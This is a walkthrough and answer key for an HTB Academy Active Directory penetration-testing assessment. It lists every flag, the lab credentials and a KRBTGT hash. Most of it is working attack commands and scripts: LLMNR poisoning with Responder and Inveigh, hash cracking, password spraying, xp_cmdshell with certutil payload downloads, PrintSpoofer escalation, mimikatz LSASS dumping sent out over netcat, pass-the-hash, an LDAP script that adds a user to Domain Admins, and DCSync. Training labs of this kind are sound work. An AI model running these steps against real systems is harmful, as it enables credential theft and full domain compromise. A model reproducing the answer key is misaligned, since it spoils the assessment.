# Section 35 — AD Enumeration & Attacks Skills Assessment Part II

> Scenario: Internal penetration test from a Parrot Linux attack host inside the network.
> SSH to attack host: `ssh htb-student@TARGET_IP` (password: `HTB_@cademy_stdnt!`)
> Internal network: 172.16.7.0/23 | DC01: 172.16.7.3 | MS01: 172.16.7.50 | SQL01: 172.16.7.60

---

## Attack Chain Overview

```
Responder (Parrot)       → AB920:weasal           (Q1, Q2)
Password Spray           → BR086:Welcome1          (Q4, Q5)
Department Shares hunt   → web.config w/ netdb     (Q6)
netdb → MSSQL → xp_cmdshell + PrintSpoofer → SYSTEM on SQL01  (Q7)
mssqlsvc NTLM (SQL01 mimikatz) → Pwn3d on MS01    (Q8)
BloodHound               → CT059 has GenericAll on Domain Admins  (Q9)
Inveigh on MS01          → CT059:charlie1          (Q10)
CT059 GenericAll → add to Domain Admins → DCSync  (Q11, Q12)
```

---

## Lab Answers

| Q | Question | Answer |
|---|----------|--------|
| 1 | Account whose hash is captured | `AB920` |
| 2 | That account's cleartext password | `weasal` |
| 3 | C:\flag.txt on MS01 | `aud1t_gr0up_m3mbersh1ps!` |
| 4 | User found via password spray | `BR086` |
| 5 | Their password | `Welcome1` |
| 6 | Password in MSSQL connection string | `D@ta_bAse_adm1n!` |
| 7 | SQL01 Administrator Desktop flag | `s3imp3rs0nate_cl@ssic` |
| 8 | MS01 Administrator Desktop flag | `exc3ss1ve_adm1n_r1ights!` |
| 9 | User with GenericAll on Domain Admins | `CT059` |
| 10 | That user's cleartext password | `charlie1` |
| 11 | DC01 Administrator Desktop flag | `acLs_f0r_th3_w1n!` |
| 12 | KRBTGT NTLM hash | `7eba70412d81c1cd030d72a3e8dbe05f` |

---

## Phase 1 — Initial Recon (from Parrot attack host)

### Step 1.1 — Sweep the internal network for hosts

```bash
crackmapexec smb 172.16.7.0/24
# crackmapexec smb = scan a range for SMB (port 445)
# This tells us every Windows host in the network: name, OS version, domain, and whether SMB signing is on
# Result:
#   DC01  172.16.7.3  - SMB signing: True  (can't relay to this one)
#   MS01  172.16.7.50 - SMB signing: False (relay target)
#   SQL01 172.16.7.60 - SMB signing: False (relay target)
# SMB signing False = we can use NTLM relay attacks against MS01 and SQL01
```
> Scans the subnet for Windows hosts over Server Message Block (SMB). Reports hostname, OS, domain, and signing status for each. Hosts with SMB signing disabled are vulnerable to NTLM relay attacks.

### Step 1.2 — Start Responder to capture hashes passively

```bash
sudo /usr/share/responder/Responder.py -I ens224 -wd
# -I ens224 = listen on the internal network interface (NOT the HTB tunnel)
# -w = enable WPAD proxy server (catches browser proxy auth)
# -d = enable DHCP poisoning responses
# Responder listens for LLMNR/NBT-NS broadcast queries from Windows hosts
# When a host queries for a bad name, Responder answers "that's me" and Windows sends credentials
# Leave this running in the background — hashes appear in /usr/share/responder/logs/
```
> Starts Responder on the internal network interface to capture LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) hashes. Use the internal interface (`ens224`), not the HTB tunnel. Let it run in the background — hashes appear in the logs directory.

### Step 1.3 — Wait for a hash to appear

```bash
sudo awk -F:: '{print $1}' /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt | sort -u
# awk -F:: '{print $1}' = split the hash line on :: and print just the username (field 1)
# The NTLMv2 hash file is named after the IP that sent the auth (172.16.7.3 = DC01)
# Result: AB920 — a user whose computer (DC01) sent credentials to Responder
```
> Extracts just the usernames from the NTLMv2 hash log. The file is named after the IP that sent the credentials. `sort -u` deduplicates repeated captures of the same user.

### Step 1.4 — Crack the captured hash

```bash
hashcat -m 5600 AB920.hash /usr/share/wordlists/rockyou.txt -O
# -m 5600 = NTLMv2 hash mode (what Responder captures)
# AB920.hash = the full hash line pasted from the Responder log
# rockyou.txt = the standard 14-million password wordlist
# -O = optimized mode, runs faster but only works for passwords under 32 chars
# Result: AB920:weasal   ← Q1 answer: AB920, Q2 answer: weasal
```
> Cracks the captured NTLMv2 hash. `-m 5600` is the hashcat mode for NTLMv2 (the format Responder captures). `-O` speeds up cracking at the cost of a 32-character password limit.

---

## Phase 2 — Credentialed Enumeration

### Step 2.1 — Verify credentials and find accessible shares

```bash
crackmapexec smb 172.16.7.0/24 -u AB920 -p weasal --shares
# -u AB920 -p weasal = authenticate as AB920 with cracked password
# --shares = list all network shares on each host and our access level
# Result:
#   DC01: "Department Shares" READ, SYSVOL READ, NETLOGON READ
#   MS01: IPC$ READ only (AB920 is not local admin here)
#   SQL01: IPC$ READ only
```
> Confirms the cracked credentials and lists accessible shares. "Department Shares" on DC01 with READ access is worth exploring for sensitive files. IPC$-only access on MS01 and SQL01 means AB920 is not a local admin there.

### Step 2.2 — Check WinRM access (remote PowerShell)

```bash
crackmapexec winrm 172.16.7.0/24 -u AB920 -p weasal
# winrm = test WinRM (port 5985) instead of SMB (port 445)
# WinRM is used for remote PowerShell sessions
# Pwn3d! = we can get a PowerShell shell on that host
# Result: MS01 → Pwn3d! (AB920 has WinRM access to MS01)
```
> Tests Windows Remote Management (WinRM) access across all hosts. "Pwn3d!" means AB920 can open a PowerShell session on that host.

### Step 2.3 — Read the MS01 C:\flag.txt (Q3)

```bash
evil-winrm -i 172.16.7.50 -u AB920 -p weasal
# evil-winrm = tool for connecting over WinRM (gives us a PowerShell shell)
# -i = IP address to connect to
# Once connected, type: type C:\flag.txt
# Result: aud1t_gr0up_m3mbersh1ps!  ← Q3 answer
```
> Opens a PowerShell shell on MS01 via evil-winrm. Once connected, read the flag from `C:\flag.txt`.

---

## Phase 3 — Password Spraying (Q4 + Q5)

### Step 3.1 — Build a domain user list

```bash
crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users | \
  grep "INLANEFREIGHT" | awk '{print $5}' | cut -d'\' -f2 > users.txt
# --users = enumerate all domain accounts via SAMR
# grep + awk + cut = extract just the usernames and save to a file
```
> Dumps all domain usernames using the Security Account Manager Remote protocol (SAMR) and writes them to a file for spraying.

### Step 3.2 — Spray a common password

```bash
kerbrute passwordspray -d inlanefreight.local /tmp/all_users.txt 'Welcome1' --dc 172.16.7.3
# kerbrute = fast Kerberos-based tool (won't cause lockouts because it uses Kerberos directly)
# passwordspray = test one password against many users (safer than brute force)
# -d inlanefreight.local = target domain
# 'Welcome1' = the password to test (try common ones: Welcome1, Password1, Season+Year)
# --dc 172.16.7.3 = the domain controller to authenticate against
# Result: BR086@inlanefreight.local:Welcome1  ← Q4: BR086, Q5: Welcome1
```
> Sprays one password against every user. kerbrute uses Kerberos directly — it does not trigger SMB login failures, so it avoids account lockout in most environments.

---

## Phase 4 — Finding the MSSQL Config (Q6)

### Step 4.1 — Explore the Department Shares

```bash
smbclient -U "BR086%Welcome1" "//172.16.7.3/Department Shares" -c "recurse;ls"
# smbclient = command-line SMB client (like a terminal FTP client for Windows shares)
# -U "user%pass" = authenticate with username and password
# "//IP/ShareName" = the UNC path to the share
# -c "recurse;ls" = run commands: recurse (show subfolders) then ls (list all files)
# Result: finds IT\Private\Development\web.config
```
> Recursively lists all files in the "Department Shares" share. `recurse;ls` walks every subfolder. Look for config files, scripts, or anything with "web", "db", "config", or "password" in the name.

### Step 4.2 — Download and read the web.config

```bash
smbclient -U "BR086%Welcome1" "//172.16.7.3/Department Shares" \
  -c "get IT/Private/Development/web.config /tmp/web.config"
cat /tmp/web.config
# get = download the file from the share to our local machine
# Result inside web.config:
#   User ID=netdb; Password=D@ta_bAse_adm1n!   ← Q6 answer
```
> Downloads the web.config file to `/tmp/` on the attack host, then reads it. ASP.NET web config files frequently contain database connection strings with cleartext credentials.

---

## Phase 5 — MSSQL Exploitation → SQL01 Flag (Q7)

### Step 5.1 — Connect to SQL01 with the found credentials

```bash
mssqlclient.py netdb:"D@ta_bAse_adm1n!"@172.16.7.60
# mssqlclient.py = Impacket tool for connecting to Microsoft SQL Server
# netdb = the SQL login username found in web.config
# The SQL server is running on SQL01 at port 1433 (default)
# Result: SQL shell prompt "SQL>"
```
> Connects to SQL01 using the credentials from web.config. Impacket's mssqlclient.py gives an interactive SQL prompt. A successful connection means the account is valid and the SQL service is reachable.

### Step 5.2 — Enable xp_cmdshell for OS command execution

```sql
enable_xp_cmdshell
-- This is a built-in mssqlclient.py command that runs:
-- sp_configure 'show advanced options', 1
-- RECONFIGURE
-- sp_configure 'xp_cmdshell', 1
-- RECONFIGURE
-- xp_cmdshell lets us run Windows CMD commands from inside SQL Server
-- This works because the SQL service has certain OS privileges
```
> Enables the `xp_cmdshell` stored procedure, which lets SQL Server execute operating system commands. mssqlclient.py wraps the two `sp_configure` calls needed to turn it on. This only works if the SQL account is a sysadmin.

### Step 5.3 — Check who we are and what privileges we have

```sql
xp_cmdshell whoami
-- Result: nt service\mssql$sqlexpress (the SQL Server service account)

xp_cmdshell whoami /priv
-- Look for: SeImpersonatePrivilege = Enabled
-- SeImpersonatePrivilege lets a process impersonate any user that connects to it
-- This is the key to escalating from SQL service → SYSTEM via potato attacks
```
> Confirms the OS identity of the SQL service account and checks its token privileges. `SeImpersonatePrivilege = Enabled` is the indicator that a potato-style escalation (PrintSpoofer, JuicyPotato) will work.

### Step 5.4 — Download PrintSpoofer to SQL01 (for privilege escalation)

```bash
# On attack host — download PrintSpoofer:
curl -sL -o ~/Downloads/PrintSpoofer64.exe \
  "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
```
> Downloads the PrintSpoofer SeImpersonate-to-SYSTEM exploit to the attack host so it can be served to the target — swap the output path/URL if you need a different release.

```sql
-- In the SQL shell:
xp_cmdshell certutil -urlcache -split -f http://172.16.7.240:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
-- certutil -urlcache -split -f = download a file from a URL (built-in Windows tool)
-- http://172.16.7.240:8000/ = our attack host's HTTP server (run: python3 -m http.server 8000)
-- 172.16.7.240 = the attack host's INTERNAL IP (not the HTB tunnel IP)
-- C:\Windows\Temp\ps.exe = where to save it on SQL01
```
> Downloads PrintSpoofer onto SQL01 via xp_cmdshell + certutil — swap the attack-host IP/port and destination path for your environment.

### Step 5.5 — Run PrintSpoofer to execute as SYSTEM

```sql
xp_cmdshell C:\Windows\Temp\ps.exe -i -c "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt"
-- PrintSpoofer abuses SeImpersonatePrivilege to execute commands as SYSTEM
-- -i = interactive mode (capture and return the output)
-- -c "cmd.exe /c ..." = the command to run as SYSTEM
-- type = Windows command to read a file (like cat on Linux)
-- Result: s3imp3rs0nate_cl@ssic  ← Q7 answer
```

---

## Phase 6 — Get MS01 Admin Flag (Q8)

### Step 6.1 — Dump credentials from SQL01 LSASS using mimikatz

```bash
# Upload mimikatz to attack host first:
scp ~/Downloads/mimikatz.exe htb-student@ATTACK_HOST_IP:/tmp/
```
> Copies mimikatz from Kali to the Parrot attack host so it can be served to SQL01 — replace `ATTACK_HOST_IP` with the spawned attack-host IP.

```sql
-- Download mimikatz to SQL01:
xp_cmdshell certutil -urlcache -split -f http://172.16.7.240:8000/mimikatz.exe C:\Windows\Temp\mk.exe
```
> Pulls mimikatz onto SQL01 via xp_cmdshell + certutil — swap the attack-host IP/port and destination path as needed.

```bash
# Create a batch file that runs mimikatz:
cat > /tmp/run_mk.bat << 'EOF'
C:\Windows\Temp\mk.exe privilege::debug sekurlsa::logonpasswords exit > C:\Windows\Temp\mko.txt 2>&1
EOF
# privilege::debug = get SeDebugPrivilege (needed to read LSASS)
# sekurlsa::logonpasswords = dump all credentials from memory (LSASS process)
# exit = quit mimikatz when done
# > C:\Windows\Temp\mko.txt = save output to a file we can read
```
> Builds a batch wrapper that runs mimikatz to dump LSASS credentials to a file — adjust the mimikatz path and output path for your target.

```sql
-- Run the batch file via PrintSpoofer (needs SYSTEM to read LSASS):
xp_cmdshell C:\Windows\Temp\ps.exe -i -c C:\Windows\Temp\run_mk.bat
-- PrintSpoofer runs the batch file as SYSTEM so mimikatz can access LSASS
```
> Executes the mimikatz batch file as SYSTEM by abusing PrintSpoofer/SeImpersonate — swap the PrintSpoofer and batch-file paths for your target.

```bash
# Exfil the output back to the attack host via nc (netcat):
# On attack host — start a listener:
nc -lvnp 9999 > /tmp/mko_exfil.txt

# Create exfil batch file:
cat > /tmp/exfil.bat << 'EOF'
C:\Windows\Temp\nc64.exe 172.16.7.240 9999 < C:\Windows\Temp\mko.txt
EOF
# nc64.exe = netcat for Windows (previously uploaded)
# 172.16.7.240 9999 = send to our listener on port 9999
# < mko.txt = pipe the mimikatz output file into nc (send it to us)
```
> Starts a netcat listener on Kali and builds a batch file that exfils the mimikatz output over nc — swap the attack-host IP/port and file paths as needed.

```bash
# Parse the exfiltrated mimikatz output for credentials:
grep -E "Username|NTLM|Password" /tmp/mko_exfil.txt | \
  grep -v "NULL\|SYSTEM\|SQL01\|Font\|Window"
# Result: mssqlsvc NTLM: 8c9555327d95f815987c0d81238c7660
# mssqlsvc is the SQL Server service account — its NTLM hash is in memory
```

### Step 6.2 — Test the mssqlsvc hash on all hosts

```bash
crackmapexec smb 172.16.7.0/24 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660
# -H = pass the NTLM hash instead of a password (Pass-the-Hash attack)
# We test the hash on all machines — mssqlsvc might have admin elsewhere
# Result: MS01 → Pwn3d! (mssqlsvc is local admin on MS01!)
```

### Step 6.3 — Read the MS01 Administrator flag

```bash
impacket-wmiexec -hashes :8c9555327d95f815987c0d81238c7660 \
  INLANEFREIGHT.LOCAL/mssqlsvc@172.16.7.50 \
  "type C:\Users\Administrator\Desktop\flag.txt"
# impacket-wmiexec = run commands on a remote Windows host via WMI (Windows Management Instrumentation)
# -hashes :NTLM = colon before the NTLM hash (no LM hash needed, just leave it empty)
# DOMAIN/user@IP = who we're authenticating as and where
# "type ..." = the command to run on MS01
# Result: exc3ss1ve_adm1n_r1ights!  ← Q8 answer
```

---

## Phase 7 — BloodHound: Find the Path to DA (Q9)

### Step 7.1 — Collect BloodHound data

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc DC01.INLANEFREIGHT.LOCAL \
  -c All -u AB920 -p weasal -ns 172.16.7.3
# bloodhound-python = collects AD data from Linux (no Windows tool needed)
# -d = domain name
# -dc = domain controller FQDN (fully qualified name like DC01.INLANEFREIGHT.LOCAL)
# -c All = collect everything: users, groups, computers, ACLs, sessions, GPOs, trusts
# -u -p = domain credentials
# -ns 172.16.7.3 = use DC01 as the DNS server so it can resolve internal hostnames
# Output: several .json files that feed into the BloodHound GUI
```
> Collects full BloodHound data from Linux using AB920's creds — swap the domain, DC FQDN, credentials, and `-ns` DC IP for your environment.

### Step 7.2 — Parse BloodHound data to find GenericAll on Domain Admins

```python
import json, glob

# Load the groups.json file and look for any user with GenericAll on Domain Admins
for fname in glob.glob('*.json'):
    data = json.loads(open(fname).read())
    for item in data.get('data', []):
        if 'DOMAIN ADMINS' in str(item.get('Properties', {}).get('name', '')).upper():
            for ace in item.get('Aces', []):
                if ace.get('RightName') == 'GenericAll' and ace.get('PrincipalType') == 'User':
                    print(f"GenericAll from: {ace['PrincipalSID']}")
# GenericAll = full control over an object (can reset password, add to group, etc.)
# On the Domain Admins GROUP = can add any member to that group
# Result: CT059 has GenericAll on Domain Admins ← Q9 answer
```

---

## Phase 8 — Capture CT059's Hash via Inveigh (Q10)

**Why Inveigh instead of Responder?**
- Responder runs on the Parrot Linux attack host. It can see traffic from the internal network, but CT059 authenticates to the DC using Kerberos (not NTLM), so Responder does not capture anything.
- Inveigh runs on MS01 — a Windows machine inside the network. It poisons Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic from inside Windows. When CT059's machine makes a bad name query, Inveigh catches the NTLMv2 response.

### Step 8.1 — Upload Invoke-Inveigh.ps1 to MS01

```bash
# Copy Inveigh to attack host:
cp /usr/share/powershell-empire/empire/server/data/module_source/collection/Invoke-Inveigh.ps1 /tmp/

# Upload from attack host to SQL01 (which we control):
# In mssqlclient.py:
xp_cmdshell certutil -urlcache -split -f http://172.16.7.240:8000/Invoke-Inveigh.ps1 C:\Windows\Temp\Inveigh.ps1
```
> Stages Invoke-Inveigh on the attack host and downloads it to SQL01 via certutil — swap the Empire source path, attack-host IP/port, and destination path as needed.

### Step 8.2 — Run Inveigh on MS01 via WMI

```bash
impacket-wmiexec -hashes :8c9555327d95f815987c0d81238c7660 \
  INLANEFREIGHT.LOCAL/mssqlsvc@172.16.7.50 \
  "powershell -c \"Import-Module C:\Windows\Temp\Inveigh.ps1; \
  Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime 3\""
# Import-Module = load the Inveigh script into PowerShell so we can use it
# Invoke-Inveigh = start the LLMNR/NBT-NS poisoning listener
# -NBNS Y = enable NetBIOS Name Service poisoning (port 137)
# -ConsoleOutput Y = print captured hashes to the screen as they arrive
# -FileOutput Y = also save captured hashes to files in C:\
# -RunTime 3 = run for 3 minutes then stop automatically
```
> Runs Inveigh on MS01 over WMI pass-the-hash to poison LLMNR/NBT-NS from inside the network — swap the mssqlsvc hash, target IP, and Inveigh path for your environment.

### Step 8.3 — Read the captured hashes from the output

```
# Inveigh output will show:
SMB NTLMv2 challenge/response captured from 172.16.7.3(DC01):
CT059::INLANEFREIGHT:9777AEBA56846B96:EAF3E3B0A46EA27A0ECCFFEA78EEE978:010100...
# The full line starting with CT059:: is the NTLMv2 hash
```

### Step 8.4 — Crack CT059's hash

```bash
hashcat -m 5600 ct059.hash /usr/share/wordlists/rockyou.txt -O
# -m 5600 = NTLMv2 hash format (same as what Responder captures)
# Same process as cracking AB920's hash earlier
# Result: CT059:charlie1  ← Q10 answer
```

---

## Phase 9 — Abuse GenericAll → Domain Admin → Flags (Q11 + Q12)

### Step 9.1 — Use CT059's GenericAll to add CT059 to Domain Admins

```python
import ldap3

# Connect to DC01 as CT059
server = ldap3.Server('172.16.7.3', get_info=ldap3.ALL)
conn = ldap3.Connection(server,
    user='INLANEFREIGHT\\CT059',
    password='charlie1',
    authentication=ldap3.NTLM)
conn.bind()
# ldap3.NTLM = use NTLM authentication (standard for Windows domains from Linux)
# conn.bind() = actually log in — if result is 'success', we're connected

# Add CT059 to the Domain Admins group
da_dn = 'CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL'
ct059_dn = 'CN=CT059,CN=Users,DC=INLANEFREIGHT,DC=LOCAL'
conn.modify(da_dn, {'member': [(ldap3.MODIFY_ADD, [ct059_dn])]})
# conn.modify = change an AD object's attributes
# 'member' = the attribute that stores group members
# MODIFY_ADD = add a new member (vs. MODIFY_REPLACE or MODIFY_DELETE)
# Result: {'result': 0, 'description': 'success'} = CT059 is now Domain Admin
```

**Why this works:** CT059 has GenericAll on the Domain Admins group object. GenericAll means full control, which includes adding members. We use CT059's credentials to make the Lightweight Directory Access Protocol (LDAP) modification directly on DC01.

### Step 9.2 — DCSync to dump all domain hashes

```bash
impacket-secretsdump INLANEFREIGHT.LOCAL/CT059:charlie1@172.16.7.3 -just-dc-ntlm
# secretsdump = dump credentials from a Windows machine remotely
# DOMAIN/USER:PASS@DC_IP = authenticate as CT059 (now DA) against DC01
# -just-dc-ntlm = only dump NTLM hashes from Active Directory (faster than everything)
# DCSync works by mimicking a domain controller replication request
# Any account with "Replication" rights (Domain Admins have it) can do this
# Result:
#   Administrator:500:aad3b435b51404eeaad3b435b51404ee:234a798328eb83fda24119597ffba70b:::
#   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
#   krbtgt NTLM hash = 7eba70412d81c1cd030d72a3e8dbe05f  ← Q12 answer
```

### Step 9.3 — Read the DC01 flag

```bash
smbclient -U "Administrator" --pw-nt-hash \
  "//172.16.7.3/C$" \
  -c "get Users\\Administrator\\Desktop\\flag.txt /tmp/dc01_flag.txt" \
  234a798328eb83fda24119597ffba70b
cat /tmp/dc01_flag.txt
# smbclient = connect to the DC01 admin share (C$) using the Administrator NTLM hash
# --pw-nt-hash = tells smbclient that the password is an NTLM hash not plaintext
# get = download the file to our local machine
# Result: acLs_f0r_th3_w1n!  ← Q11 answer
```

---

## Key Lessons

| Technique | Why It Worked |
|-----------|--------------|
| Responder on ens224 | Internal interface captures LLMNR/NBT-NS broadcasts from domain hosts |
| Password Spray with kerbrute | Kerberos-based — no failed login event that triggers lockout |
| web.config in Department Shares | Files on network shares often contain cleartext credentials |
| xp_cmdshell via MSSQL | SQL Server runs as a service account with SeImpersonatePrivilege |
| PrintSpoofer | SeImpersonatePrivilege → impersonate SYSTEM → read anything |
| Pass-the-Hash (mssqlsvc) | NTLM hash from LSASS works the same as a password for SMB/WMI auth |
| Inveigh (NOT Responder) for CT059 | CT059 uses Kerberos for DC auth but NTLM for name lookups — Inveigh on MS01 (inside the network) catches it; Responder on Parrot misses it |
| GenericAll → Add to Domain Admins | GenericAll on a group = full control = add any member |
| DCSync | Domain Admins can replicate NTDS.DIT → dump every hash in the domain |

---

## Exam Notes

- Always check SMB signing first — `False` = relay attacks possible on that host
- Run Responder on the INTERNAL interface (`ens224`), not the HTB tunnel (`tun0`)
- NTLMv2 hashes from Responder → crack with `hashcat -m 5600`
- NTLM hashes from secretsdump/mimikatz → crack with `hashcat -m 1000` OR pass-the-hash
- `crackmapexec winrm ... Pwn3d!` = WinRM access, NOT necessarily local admin
- `crackmapexec smb ... Pwn3d!` = local admin on that host
- xp_cmdshell only works if the SQL account is `sysadmin` — check with `SELECT IS_SRVROLEMEMBER('sysadmin')`
- SeImpersonatePrivilege → PrintSpoofer (Server 2019) or JuicyPotato (older) → SYSTEM
- **Inveigh vs Responder:** Inveigh runs on Windows hosts INSIDE the network — it catches users that Responder misses because their domain traffic (Kerberos) doesn't go to the Parrot box but their name lookups (LLMNR) do hit Inveigh running on MS01
- GenericAll on a GROUP = can add/remove members of that group
- DCSync requires domain admin or explicit Replication rights granted to an account
- KRBTGT hash = used to forge Golden Tickets — always grab this during domain compromise
